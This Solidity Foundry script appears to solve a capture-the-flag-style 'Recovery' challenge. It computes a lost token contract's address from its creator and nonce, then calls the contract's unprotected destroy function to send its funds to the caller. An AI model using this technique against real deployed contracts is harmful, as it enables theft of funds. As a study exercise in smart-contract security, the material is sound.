// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoverySolution is Script {

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address recovery = 0x0c49511429317D3B4E308Eab5185090c1Fe752BC;

        // Compute contract address (nonce = 1)
        address tokenAddress = computeAddress(recovery, 1);

        // Call destroy on SimpleToken
        ISimpleToken(tokenAddress).destroy(payable(msg.sender));

        vm.stopBroadcast();
    }

    function computeAddress(address creator, uint nonce) internal pure returns (address) {
        if (nonce == 0x00)     return address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xd6), bytes1(0x94), creator, bytes1(0x80)
        )))));
        if (nonce <= 0x7f)     return address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xd6), bytes1(0x94), creator, uint8(nonce)
        )))));

        revert("Nonce too large");
    }
}